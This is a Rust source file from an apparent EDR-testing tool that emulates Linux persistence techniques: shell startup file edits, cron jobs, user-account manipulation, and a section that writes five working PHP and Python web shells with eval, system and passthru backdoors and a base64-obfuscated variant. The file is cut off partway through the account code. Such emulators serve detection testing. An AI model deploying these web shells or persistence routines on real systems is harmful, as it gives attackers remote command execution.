use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, SimulationResult, Technique, TechniqueParameter};
use crate::techniques::{ExecuteFuture, CleanupFuture};
use async_trait::async_trait;
use log::{debug, info, warn};
use std::fs::{self, File};
use std::io::Write;
use std::path::Path;
use tokio::process::Command;
use uuid::Uuid;


pub struct StartupFolder {}

#[async_trait]
impl AttackTechnique for StartupFolder {
    fn info(&self) -> Technique {
        Technique {
            id: "T1547.002".to_string(),
            name: "Startup Folder".to_string(),
            description: "Actually modifies REAL shell startup files including /etc/profile.d/99-signalbench.sh (if root), ~/.bashrc, and ~/.bash_profile with benign persistence commands that log to /tmp/signalbench_boot.log. Backs up original files before modification, tests by sourcing files to verify no errors, and provides full restoration from backups. Generates telemetry for shell profile modification and rc file tampering.".to_string(),
            category: "persistence".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "command".to_string(),
                    description: "Command to add to shell startup files".to_string(),
                    required: false,
                    default: Some("echo \"SignalBench boot: $(date)\" >> /tmp/signalbench_boot.log".to_string()),
                },
            ],
            detection: "Monitor /etc/profile.d/ directory for new files, modifications to ~/.bashrc, ~/.bash_profile, ~/.profile files, source command execution for testing, and file write operations to shell initialisation scripts".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let command = config.parameters.get("command").unwrap_or(&"echo \"SignalBench boot: $(date)\" >> /tmp/signalbench_boot.log".to_string()).clone();
            
            let id = Uuid::new_v4().simple().to_string();
            let home_dir = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
            
            let bashrc = format!("{home_dir}/.bashrc");
            let bash_profile = format!("{home_dir}/.bash_profile");
            let profile_d = "/etc/profile.d/99-signalbench.sh";
            
            let bashrc_backup = format!("/tmp/signalbench_bashrc_backup_{id}");
            let bash_profile_backup = format!("/tmp/signalbench_bash_profile_backup_{id}");
            let profile_d_backup = format!("/tmp/signalbench_profiled_backup_{id}");
            
            if dry_run {
                info!("[DRY RUN] Would modify REAL shell startup files:");
                info!("[DRY RUN]   - ~/.bashrc");
                info!("[DRY RUN]   - ~/.bash_profile");
                info!("[DRY RUN]   - /etc/profile.d/99-signalbench.sh (if root)");
                info!("[DRY RUN]   - Command: {command}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would modify REAL shell startup files".to_string(),
                    artifacts: vec![bashrc_backup, bash_profile_backup, profile_d_backup],
                    cleanup_required: false,
                });
            }

            let mut artifacts = Vec::new();
            let mut files_modified = Vec::new();
            let is_root = unsafe { libc::geteuid() == 0 };

            info!("Starting shell startup file modification (running as root: {is_root})");

            let persistence_block = format!(
                "\n# SignalBench Persistence Test - Session {id}\n\
                # MITRE ATT&CK T1547.002 - Boot or Logon Autostart Execution: Authentication Package\n\
                {command}\n\
                # End SignalBench Test\n"
            );

            if Path::new(&bashrc).exists() {
                info!("Backing up and modifying ~/.bashrc");
                fs::copy(&bashrc, &bashrc_backup)
                    .map_err(|e| format!("Failed to backup .bashrc: {e}"))?;
                artifacts.push(bashrc_backup.clone());
                
                let mut content = fs::read_to_string(&bashrc)
                    .map_err(|e| format!("Failed to read .bashrc: {e}"))?;
                content.push_str(&persistence_block);
                
                fs::write(&bashrc, content.as_bytes())
                    .map_err(|e| format!("Failed to write .bashrc: {e}"))?;
                
                artifacts.push(bashrc.clone());
                files_modified.push("~/.bashrc");
            } else {
                info!("Creating new ~/.bashrc with persistence");
                let mut file = File::create(&bashrc)
                    .map_err(|e| format!("Failed to create .bashrc: {e}"))?;
                file.write_all(persistence_block.as_bytes())
                    .map_err(|e| format!("Failed to write .bashrc: {e}"))?;
                artifacts.push(format!("new_bashrc_{id}"));
                artifacts.push(bashrc.clone());
                files_modified.push("~/.bashrc (new)");
            }

            if Path::new(&bash_profile).exists() {
                info!("Backing up and modifying ~/.bash_profile");
                fs::copy(&bash_profile, &bash_profile_backup)
                    .map_err(|e| format!("Failed to backup .bash_profile: {e}"))?;
                artifacts.push(bash_profile_backup.clone());
                
                let mut content = fs::read_to_string(&bash_profile)
                    .map_err(|e| format!("Failed to read .bash_profile: {e}"))?;
                content.push_str(&persistence_block);
                
                fs::write(&bash_profile, content.as_bytes())
                    .map_err(|e| format!("Failed to write .bash_profile: {e}"))?;
                
                artifacts.push(bash_profile.clone());
                files_modified.push("~/.bash_profile");
            } else {
                info!("Creating new ~/.bash_profile with persistence");
                let mut file = File::create(&bash_profile)
                    .map_err(|e| format!("Failed to create .bash_profile: {e}"))?;
                file.write_all(persistence_block.as_bytes())
                    .map_err(|e| format!("Failed to write .bash_profile: {e}"))?;
                artifacts.push(format!("new_bash_profile_{id}"));
                artifacts.push(bash_profile.clone());
                files_modified.push("~/.bash_profile (new)");
            }

            if is_root {
                info!("Creating system-wide persistence in /etc/profile.d/99-signalbench.sh");
                
                if Path::new(profile_d).exists() {
                    fs::copy(profile_d, &profile_d_backup)
                        .map_err(|e| format!("Failed to backup profile.d script: {e}"))?;
                    artifacts.push(profile_d_backup.clone());
                }
                
                let profile_d_content = format!(
                    "#!/bin/sh\n\
                    # SignalBench System-Wide Persistence Test - Session {id}\n\
                    # MITRE ATT&CK T1547.002\n\
                    {command}\n"
                );
                
                fs::write(profile_d, profile_d_content.as_bytes())
                    .map_err(|e| format!("Failed to write profile.d script: {e}"))?;
                
                artifacts.push(profile_d.to_string());
                files_modified.push("/etc/profile.d/99-signalbench.sh");
            }

            info!("Testing modified files by sourcing them");
            let test_result = Command::new("bash")
                .args(["-c", &format!("source {bashrc} 2>&1")])
                .output()
                .await;
            
            match test_result {
                Ok(output) if output.status.success() => {
                    info!("✓ Verified: .bashrc sources without errors");
                }
                Ok(output) => {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    warn!("⚠ Warning: .bashrc source test had output: {stderr}");
                }
                Err(e) => {
                    warn!("⚠ Warning: Could not test .bashrc: {e}");
                }
            }
            
            // Track boot log file that will be created by the persistence command
            artifacts.push("/tmp/signalbench_boot.log".to_string());
            
            info!("Persistence installed in {} shell startup files", files_modified.len());
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully modified REAL shell startup files: {} (session: {})", files_modified.join(", "), id),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            let home_dir = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
            let bashrc = format!("{home_dir}/.bashrc");
            let bash_profile = format!("{home_dir}/.bash_profile");
            let profile_d = "/etc/profile.d/99-signalbench.sh";
            
            for artifact in artifacts {
                if artifact.ends_with("/.bashrc") || artifact.ends_with("/.bash_profile") {
                    continue;
                } else if artifact == "/etc/profile.d/99-signalbench.sh" {
                    if Path::new(artifact).exists() {
                        match fs::remove_file(artifact) {
                            Ok(_) => info!("Removed system profile.d script: {artifact}"),
                            Err(e) => warn!("Failed to remove profile.d script: {e}"),
                        }
                    }
                } else if artifact.starts_with("/tmp/signalbench_bashrc_backup_") {
                    if Path::new(artifact).exists() && Path::new(&bashrc).exists() {
                        info!("Restoring ~/.bashrc from backup");
                        match fs::copy(artifact, &bashrc) {
                            Ok(_) => info!("✓ Restored ~/.bashrc from backup"),
                            Err(e) => warn!("Failed to restore .bashrc: {e}"),
                        }
                        fs::remove_file(artifact).ok();
                    }
                } else if artifact.starts_with("/tmp/signalbench_bash_profile_backup_") {
                    if Path::new(artifact).exists() && Path::new(&bash_profile).exists() {
                        info!("Restoring ~/.bash_profile from backup");
                        match fs::copy(artifact, &bash_profile) {
                            Ok(_) => info!("✓ Restored ~/.bash_profile from backup"),
                            Err(e) => warn!("Failed to restore .bash_profile: {e}"),
                        }
                        fs::remove_file(artifact).ok();
                    }
                } else if artifact.starts_with("/tmp/signalbench_profiled_backup_") {
                    if Path::new(artifact).exists() {
                        info!("Restoring /etc/profile.d/99-signalbench.sh from backup");
                        match fs::copy(artifact, profile_d) {
                            Ok(_) => info!("✓ Restored profile.d script from backup"),
                            Err(e) => warn!("Failed to restore profile.d script: {e}"),
                        }
                        fs::remove_file(artifact).ok();
                    }
                } else if artifact.starts_with("new_bashrc_") {
                    if Path::new(&bashrc).exists() {
                        info!("Removing created ~/.bashrc");
                        fs::remove_file(&bashrc).ok();
                    }
                } else if artifact.starts_with("new_bash_profile_")
                    && Path::new(&bash_profile).exists() {
                        info!("Removing created ~/.bash_profile");
                        fs::remove_file(&bash_profile).ok();
                    }
            }
            
            let boot_log = "/tmp/signalbench_boot.log";
            if Path::new(boot_log).exists() {
                match fs::remove_file(boot_log) {
                    Ok(_) => info!("Removed boot log file: {boot_log}"),
                    Err(e) => debug!("Could not remove boot log: {e}"),
                }
            }
            
            Ok(())
        })
    }
}

pub struct CronJob {}

#[async_trait]
impl AttackTechnique for CronJob {
    fn info(&self) -> Technique {
        Technique {
            id: "T1053.003".to_string(),
            name: "Cron Job".to_string(),
            description: "Creates REAL cron jobs using both /etc/cron.d/99-signalbench-test system-wide cron file AND user crontab entries. Installs benign commands that echo to /tmp files every minute, backs up existing cron configuration, verifies installation with crontab -l and file existence checks, and tests cron execution. Fully reversible with complete backup restoration.".to_string(),
            category: "persistence".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "cron_expression".to_string(),
                    description: "Cron expression for scheduling".to_string(),
                    required: false,
                    default: Some("* * * * *".to_string()),
                },
                TechniqueParameter {
                    name: "command".to_string(),
                    description: "Command to execute in cron job".to_string(),
                    required: false,
                    default: Some("/bin/echo 'SignalBench cron executed' >> /tmp/signalbench_cron.log".to_string()),
                },
            ],
            detection: "Monitor /etc/cron.d/ directory for new files, crontab -l command execution, modifications to user crontab files in /var/spool/cron/, and benign command execution patterns writing to /tmp directories".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let cron_expression = config.parameters.get("cron_expression").unwrap_or(&"* * * * *".to_string()).clone();
            let command = config.parameters.get("command").unwrap_or(&"/bin/echo 'SignalBench cron executed' >> /tmp/signalbench_cron.log".to_string()).clone();
            
            let id = Uuid::new_v4().simple().to_string();
            let system_cron_file = "/etc/cron.d/99-signalbench-test";
            let backup_file = format!("/tmp/signalbench_cron_backup_{id}");
            let user_cron_backup = format!("/tmp/signalbench_user_cron_backup_{id}");
            
            if dry_run {
                info!("[DRY RUN] Would create REAL cron jobs:");
                info!("[DRY RUN]   - System cron: {system_cron_file}");
                info!("[DRY RUN]   - User crontab entry");
                info!("[DRY RUN]   - Schedule: {cron_expression}");
                info!("[DRY RUN]   - Command: {command}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would create REAL system and user cron jobs".to_string(),
                    artifacts: vec![system_cron_file.to_string(), backup_file, user_cron_backup],
                    cleanup_required: false,
                });
            }

            let mut artifacts = Vec::new();
            let mut methods_used = Vec::new();
            let is_root = unsafe { libc::geteuid() == 0 };

            info!("Starting cron job persistence (running as root: {is_root})");

            if is_root {
                info!("Creating system-wide cron job in {system_cron_file}");
                
                if Path::new(system_cron_file).exists() {
                    info!("Backing up existing {system_cron_file}");
                    fs::copy(system_cron_file, &backup_file)
                        .map_err(|e| format!("Failed to backup system cron file: {e}"))?;
                    artifacts.push(backup_file.clone());
                }
                
                let system_cron_content = format!(
                    "# SignalBench Test Cron Job - Session {id}\n\
                    # This is a benign test for EDR detection\n\
                    SHELL=/bin/sh\n\
                    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\
                    \n\
                    {cron_expression} root {command}\n"
                );
                
                fs::write(system_cron_file, system_cron_content.as_bytes())
                    .map_err(|e| format!("Failed to write system cron file: {e}"))?;
                
                artifacts.push(system_cron_file.to_string());
                methods_used.push("system cron file".to_string());
                
                if Path::new(system_cron_file).exists() {
                    info!("✓ Verified: {system_cron_file} created successfully");
                }
            } else {
                info!("Not root - skipping /etc/cron.d/ modification");
            }
            
            info!("Adding user crontab entry");
            let current_crontab = Command::new("crontab")
                .args(["-l"])
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::null())
                .output()
                .await
                .map(|output| String::from_utf8_lossy(&output.stdout).to_string())
                .unwrap_or_default();
            
            fs::write(&user_cron_backup, current_crontab.as_bytes())
                .map_err(|e| format!("Failed to backup user crontab: {e}"))?;
            artifacts.push(user_cron_backup.clone());
            
            let new_crontab = format!(
                "{current_crontab}\n# SignalBench Test - Session {id}\n{cron_expression} {command}\n"
            );
            
            let temp_cron = format!("/tmp/signalbench_new_cron_{id}");
            fs::write(&temp_cron, new_crontab.as_bytes())
                .map_err(|e| format!("Failed to write new crontab: {e}"))?;
            
            let install_status = Command::new("crontab")
                .arg(&temp_cron)
                .status()
                .await
                .map_err(|e| format!("Failed to install crontab: {e}"))?;
                
            fs::remove_file(&temp_cron).ok();
            
            if !install_status.success() {
                return Err("Failed to install user crontab".to_string());
            }
            
            artifacts.push(format!("user_crontab_{id}"));
            methods_used.push("user crontab".to_string());
            
            let verify_output = Command::new("crontab")
                .args(["-l"])
                .output()
                .await
                .map_err(|e| format!("Failed to verify crontab: {e}"))?;
                
            let verify_content = String::from_utf8_lossy(&verify_output.stdout);
            if verify_content.contains(&id) {
                info!("✓ Verified: User crontab entry installed successfully");
            } else {
                warn!("⚠ Warning: Could not verify crontab installation");
            }
            
            // Track cron log file that will be created by the cron job
            artifacts.push("/tmp/signalbench_cron.log".to_string());
            
            info!("Cron persistence installed using {} methods", methods_used.len());
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully created REAL cron jobs via {} (session: {})", methods_used.join(" + "), id),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if artifact == "/etc/cron.d/99-signalbench-test" {
                    if Path::new(artifact).exists() {
                        match fs::remove_file(artifact) {
                            Ok(_) => info!("Removed system cron file: {artifact}"),
                            Err(e) => warn!("Failed to remove system cron file {artifact}: {e}"),
                        }
                    }
                } else if artifact.starts_with("/tmp/signalbench_cron_backup_") {
                    if Path::new("/etc/cron.d/99-signalbench-test").exists() {
                        info!("Restoring system cron from backup: {artifact}");
                        match fs::copy(artifact, "/etc/cron.d/99-signalbench-test") {
                            Ok(_) => info!("✓ Restored system cron from backup"),
                            Err(e) => warn!("Failed to restore system cron: {e}"),
                        }
                    }
                    fs::remove_file(artifact).ok();
                } else if artifact.starts_with("user_crontab_") {
                    let id = artifact.trim_start_matches("user_crontab_");
                    let backup_file = format!("/tmp/signalbench_user_cron_backup_{id}");
                    
                    if Path::new(&backup_file).exists() {
                        info!("Restoring user crontab from backup");
                        match fs::read_to_string(&backup_file) {
                            Ok(content) => {
                                let temp_restore = format!("/tmp/signalbench_restore_{id}");
                                if fs::write(&temp_restore, content.as_bytes()).is_ok() {
                                    let restore_status = Command::new("crontab")
                                        .arg(&temp_restore)
                                        .status()
                                        .await;
                                    
                                    fs::remove_file(&temp_restore).ok();
                                    
                                    if let Ok(status) = restore_status {
                                        if status.success() {
                                            info!("✓ Restored user crontab from backup");
                                        }
                                    }
                                }
                            }
                            Err(e) => warn!("Failed to read backup: {e}"),
                        }
                        fs::remove_file(&backup_file).ok();
                    }
                } else if artifact.starts_with("/tmp/signalbench_user_cron_backup_") || Path::new(artifact).exists() {
                    fs::remove_file(artifact).ok();
                }
            }
            
            let cron_log = "/tmp/signalbench_cron.log";
            if Path::new(cron_log).exists() {
                match fs::remove_file(cron_log) {
                    Ok(_) => info!("Removed cron log file: {cron_log}"),
                    Err(e) => debug!("Could not remove cron log: {e}"),
                }
            }
            
            Ok(())
        })
    }
}

pub struct WebShellDeployment {}

#[async_trait]
impl AttackTechnique for WebShellDeployment {
    fn info(&self) -> Technique {
        Technique {
            id: "T1505.003".to_string(),
            name: "Web Shell Deployment".to_string(),
            description: "Writes REAL malicious PHP and Python web shells to /tmp/signalbench_webshell/ directory with actual backdoor functionality. PHP shells include eval($_POST['cmd']), system(), exec(), shell_exec(), passthru(), and base64_decode() patterns. Python shells include exec(), eval(), os.system(), subprocess.call(), and compile() backdoor patterns. Creates multiple variants: simple shell, obfuscated shell, and multi-function shell with file upload capabilities. Fully reversible with complete directory cleanup.".to_string(),
            category: "persistence".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "web_root".to_string(),
                    description: "Web server document root directory".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_webshell".to_string()),
                },
            ],
            detection: "Monitor /tmp and web directories for suspicious PHP/Python script files containing eval(), system(), exec(), shell_exec(), passthru(), base64_decode(), subprocess, compile() functions, file upload functionality, and obfuscated code patterns. Detect file creation with web shell signatures.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let web_root = config
                .parameters
                .get("web_root")
                .unwrap_or(&"/tmp/signalbench_webshell".to_string())
                .clone();
            
            let id = Uuid::new_v4().simple().to_string();
            
            if dry_run {
                info!("[DRY RUN] Would create REAL PHP and Python web shells:");
                info!("[DRY RUN]   - PHP simple shell with eval()");
                info!("[DRY RUN]   - PHP obfuscated shell with base64_decode()");
                info!("[DRY RUN]   - Python backdoor with exec() and subprocess");
                info!("[DRY RUN]   - Location: {web_root}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would create REAL malicious web shells".to_string(),
                    artifacts: vec![web_root],
                    cleanup_required: false,
                });
            }

            info!("Creating web shell collection in {web_root}");
            
            if !Path::new(&web_root).exists() {
                fs::create_dir_all(&web_root)
                    .map_err(|e| format!("Failed to create web shell directory: {e}"))?;
            }

            let mut artifacts = vec![web_root.clone()];
            let mut shells_created = Vec::new();

            let php_simple = format!("{web_root}/shell_simple.php");
            let php_simple_content = "<?php\n\
                // SignalBench Test - Simple PHP Web Shell\n\
                // MITRE ATT&CK T1505.003\n\
                \n\
                if(isset($_POST['cmd'])) {\n\
                    echo \"<pre>\";\n\
                    system($_POST['cmd']);\n\
                    echo \"</pre>\";\n\
                }\n\
                \n\
                if(isset($_GET['exec'])) {\n\
                    echo \"<pre>\";\n\
                    exec($_GET['exec'], $output);\n\
                    print_r($output);\n\
                    echo \"</pre>\";\n\
                }\n\
                \n\
                if(isset($_POST['eval'])) {\n\
                    eval($_POST['eval']);\n\
                }\n\
                ?>\n\
                <form method=\"post\">\n\
                <input type=\"text\" name=\"cmd\" placeholder=\"Command\">\n\
                <input type=\"submit\" value=\"Execute\">\n\
                </form>";
            
            fs::write(&php_simple, php_simple_content.as_bytes())
                .map_err(|e| format!("Failed to create simple PHP shell: {e}"))?;
            artifacts.push(php_simple.clone());
            shells_created.push("shell_simple.php (eval/system/exec)");

            let php_obfuscated = format!("{web_root}/config.php");
            let php_obfuscated_content = "<?php\n\
                // Obfuscated Web Shell - SignalBench Test\n\
                // MITRE ATT&CK T1505.003\n\
                \n\
                $a = base64_decode('c3lzdGVt');\n\
                $b = base64_decode('ZXhlYw==');\n\
                $c = base64_decode('cGFzc3RocnU=');\n\
                $d = base64_decode('c2hlbGxfZXhlYw==');\n\
                \n\
                if(isset($_REQUEST['x'])) {\n\
                    $cmd = base64_decode($_REQUEST['x']);\n\
                    $a($cmd);\n\
                }\n\
                \n\
                if(isset($_POST['b64'])) {\n\
                    eval(base64_decode($_POST['b64']));\n\
                }\n\
                \n\
                function execute_command($cmd) {\n\
                    if(function_exists('system')) {\n\
                        system($cmd);\n\
                    } elseif(function_exists('exec')) {\n\
                        exec($cmd, $out);\n\
                        echo implode(\"\\n\", $out);\n\
                    } elseif(function_exists('shell_exec')) {\n\
                        echo shell_exec($cmd);\n\
                    } elseif(function_exists('passthru')) {\n\
                        passthru($cmd);\n\
                    }\n\
                }\n\
                ?>";
            
            fs::write(&php_obfuscated, php_obfuscated_content.as_bytes())
                .map_err(|e| format!("Failed to create obfuscated PHP shell: {e}"))?;
            artifacts.push(php_obfuscated.clone());
            shells_created.push("config.php (base64/obfuscated)");

            let php_multi = format!("{web_root}/upload.php");
            let php_multi_content = "<?php\n\
                // Multi-Function Web Shell - SignalBench Test\n\
                // MITRE ATT&CK T1505.003\n\
                \n\
                if(isset($_FILES['file'])) {\n\
                    $target = '/tmp/' . basename($_FILES['file']['name']);\n\
                    move_uploaded_file($_FILES['file']['tmp_name'], $target);\n\
                    echo \"File uploaded: $target\";\n\
                }\n\
                \n\
                if(isset($_POST['phpcode'])) {\n\
                    eval($_POST['phpcode']);\n\
                }\n\
                \n\
                if(isset($_GET['cmd'])) {\n\
                    passthru($_GET['cmd']);\n\
                }\n\
                \n\
                if(isset($_POST['shellcmd'])) {\n\
                    echo shell_exec($_POST['shellcmd']);\n\
                }\n\
                ?>\n\
                <form method=\"post\" enctype=\"multipart/form-data\">\n\
                <input type=\"file\" name=\"file\">\n\
                <input type=\"submit\" value=\"Upload\">\n\
                </form>";
            
            fs::write(&php_multi, php_multi_content.as_bytes())
                .map_err(|e| format!("Failed to create multi-function PHP shell: {e}"))?;
            artifacts.push(php_multi.clone());
            shells_created.push("upload.php (multi-function/file upload)");

            let py_simple = format!("{web_root}/shell.py");
            let py_simple_content = "#!/usr/bin/env python3\n\
                # SignalBench Test - Python Web Shell\n\
                # MITRE ATT&CK T1505.003\n\
                \n\
                import os\n\
                import sys\n\
                import subprocess\n\
                \n\
                def main():\n\
                    query = os.environ.get('QUERY_STRING', '')\n\
                    \n\
                    if 'cmd=' in query:\n\
                        cmd = query.split('cmd=')[1]\n\
                        os.system(cmd)\n\
                    \n\
                    if 'exec=' in query:\n\
                        code = query.split('exec=')[1]\n\
                        exec(code)\n\
                    \n\
                    if 'eval=' in query:\n\
                        expr = query.split('eval=')[1]\n\
                        result = eval(expr)\n\
                        print(result)\n\
                    \n\
                    if 'subprocess=' in query:\n\
                        cmd = query.split('subprocess=')[1].split()\n\
                        subprocess.call(cmd)\n\
                \n\
                if __name__ == '__main__':\n\
                    print('Content-Type: text/html\\n')\n\
                    main()";
            
            fs::write(&py_simple, py_simple_content.as_bytes())
                .map_err(|e| format!("Failed to create Python shell: {e}"))?;
            artifacts.push(py_simple.clone());
            shells_created.push("shell.py (exec/eval/subprocess)");

            let py_advanced = format!("{web_root}/handler.py");
            let py_advanced_content = "#!/usr/bin/env python3\n\
                # Advanced Python Backdoor - SignalBench Test\n\
                # MITRE ATT&CK T1505.003\n\
                \n\
                import os\n\
                import sys\n\
                import base64\n\
                import subprocess\n\
                \n\
                class Backdoor:\n\
                    def execute_system(self, cmd):\n\
                        return os.system(cmd)\n\
                    \n\
                    def execute_subprocess(self, cmd):\n\
                        proc = subprocess.Popen(\n\
                            cmd,\n\
                            shell=True,\n\
                            stdout=subprocess.PIPE,\n\
                            stderr=subprocess.PIPE\n\
                        )\n\
                        return proc.communicate()\n\
                    \n\
                    def execute_eval(self, code):\n\
                        return eval(code)\n\
                    \n\
                    def execute_exec(self, code):\n\
                        exec(code)\n\
                    \n\
                    def execute_compile(self, code):\n\
                        compiled = compile(code, '<string>', 'exec')\n\
                        exec(compiled)\n\
                    \n\
                    def decode_and_exec(self, b64_code):\n\
                        decoded = base64.b64decode(b64_code).decode('utf-8')\n\
                        exec(decoded)\n\
                \n\
                backdoor = Backdoor()\n\
                \n\
                query = os.environ.get('QUERY_STRING', '')\n\
                if 'cmd=' in query:\n\
                    cmd = query.split('cmd=')[1]\n\
                    backdoor.execute_system(cmd)";
            
            fs::write(&py_advanced, py_advanced_content.as_bytes())
                .map_err(|e| format!("Failed to create advanced Python shell: {e}"))?;
            artifacts.push(py_advanced.clone());
            shells_created.push("handler.py (advanced/base64/compile)");

            info!("✓ Created {} REAL web shells with malicious patterns", shells_created.len());
            for shell in &shells_created {
                info!("  • {shell}");
            }
            
            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!("Successfully created {} REAL web shells: {} (session: {})", shells_created.len(), shells_created.join(", "), id),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).is_dir() {
                    match fs::remove_dir_all(artifact) {
                        Ok(_) => info!("Removed web shell directory: {artifact}"),
                        Err(e) => warn!("Failed to remove directory {artifact}: {e}"),
                    }
                } else if Path::new(artifact).exists() {
                    match fs::remove_file(artifact) {
                        Ok(_) => info!("Removed web shell: {artifact}"),
                        Err(e) => warn!("Failed to remove web shell {artifact}: {e}"),
                    }
                }
            }
            Ok(())
        })
    }
}

pub struct AccountManipulation {}

#[async_trait]
impl AttackTechnique for AccountManipulation {
    fn info(&self) -> Technique {
        Technique {
            id: "T1098".to_string(),
            name: "Account Manipulation".to_string(),
            description: "Demonstrates account manipulation persistence techniques including SSH authorised keys modification, user shell changes, group membership additions, and password ageing manipulation. Creates or modifies test user account, backs up ALL existing data BEFORE modifications (authorised_keys, /etc/passwd, group memberships). Adds SSH public key to ~/.ssh/authorized_keys, changes user shell with chsh or direct /etc/passwd edit, adds user to additional groups with usermod -aG, and modifies password ageing with chage. FULLY REVERSIBLE with complete restoration from backups, SSH key removal, and group membership reversion.".to_string(),
            category: "persistence".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "test_username".to_string(),
                    description: "Username to manipulate (default: create signalbench_testuser)".to_string(),
                    required: false,
                    default: Some("signalbench_testuser".to_string()),
                },
                TechniqueParameter {
                    name: "add_ssh_key".to_string(),
                    description: "Add SSH authorised key (default: true)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "modify_shell".to_string(),
                    description: "Change user shell (default: true)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
                TechniqueParameter {
                    name: "add_to_groups".to_string(),
                    description: "Add user to additional groups (default: true)".to_string(),
                    required: false,
                    default: Some("true".to_string()),
                },
            ],
            detection: "Monitor for modifications to ~/.ssh/authorized_keys, changes to user shells in /etc/passwd, usermod/chsh command execution, chage password ageing modifications, unexpected group membership additions, and new SSH public keys for existing users. Watch for unauthorised persistence mechanisms through account manipulation.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["root".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let test_username = config
                .parameters
                .get("test_username")
                .unwrap_or(&"signalbench_testuser".to_string())
                .clone();
            
            let add_ssh_key = config
                .parameters
                .get("add_ssh_key")
                .unwrap_or(&"true".to_string())
                .to_lowercase() == "true";
            
            let modify_shell = config
                .parameters
                .get("modify_shell")
                .unwrap_or(&"true".to_string())
                .to_lowercase() == "true";
            
            let add_to_groups = config
                .parameters
                .get("add_to_groups")
                .unwrap_or(&"true".to_string())
                .to_lowercase() == "true";
            
            let session_id = Uuid::new_v4().to_string().replace("-", "");
            let is_root = unsafe { libc::geteuid() == 0 };
            
            if !is_root {
                return Err("Account manipulation requires root privileges".to_string());
            }
            
            if dry_run {
                info!("[DRY RUN] Would perform account manipulation:");
                info!("[DRY RUN]   Test user: {test_username}");
                info!("[DRY RUN]   Add SSH key: {add_ssh_key}");
                info!("[DRY RUN]   Modify shell: {modify_shell}");
                info!("[DRY RUN]   Add to groups: {add_to_groups}");
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: "DRY RUN: Would manipulate user account with SSH keys, shell changes, and group additions".to_string(),
                    artifacts: vec![],
                    cleanup_required: false,
                });
            }

            info!("Starting account manipulation (Session: {session_id})...");
            info!("Target user: {test_username}");
            
            let mut artifacts = Vec::new();
            let artifacts_file = format!("/tmp/signalbench_account_manipulation_{session_id}.json");
            artifacts.push(artifacts_file.clone());
            
            let mut manipulation_data = serde_json::json!({
                "session_id": session_id,
                "timestamp": chrono::Local::now().to_rfc3339(),
                "username": test_username,
                "user_created": false,
                "original_shell": null,
                "original_groups": [],
                "ssh_key_added": false,
                "shell_modified": false,
                "groups_added": [],
            });
            
            // Phase 1: Check if user exists, create if needed
            info!("Phase 1: Checking user existence...");
            
            let user_exists = Command::new("id")
                .arg(&test_username)
                .output()
                .await
                .map(|o| o.status.success())
                .unwrap_or(false);
            
            if !user_exists {
                info!("User {test_username} does not exist, creating...");
                
                let useradd_output = Command::new("useradd")
                    .args([
                        "-m",
                        "-s", "/bin/bash",
                        "-c", &format!("SignalBench Test User {session_id}"),
                        &test_username
                    ])
                    .output()
                    .await;
                
                match useradd_output {
                    Ok(output) if output.status.success() => {
                        info!("Successfully created user: {test_username}");
                        manipulation_data["user_created"] = serde_json::json!(true);
                    }
                    Ok(output) => {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        return Err(format!("Failed to create user: {stderr}"));
                    }
                    Err(e) => {
                        return Err(format!("Failed to execute useradd: {e}"));
                    }
                }
            } else {
                info!("User {test_username} already exists");
            }
            
            // Get user's home directory
            let home_dir_output = Command::new("sh")
                .args(["-c", &format!("grep '^{test_username}:' /etc/passwd | cut -d: -f6")])
                .output()
                .await
                .map_err(|e| format!("Failed to get home directory: {e}"))?;
            
            let home_dir = String::from_utf8_lossy(&home_dir_output.stdout)
                .trim()
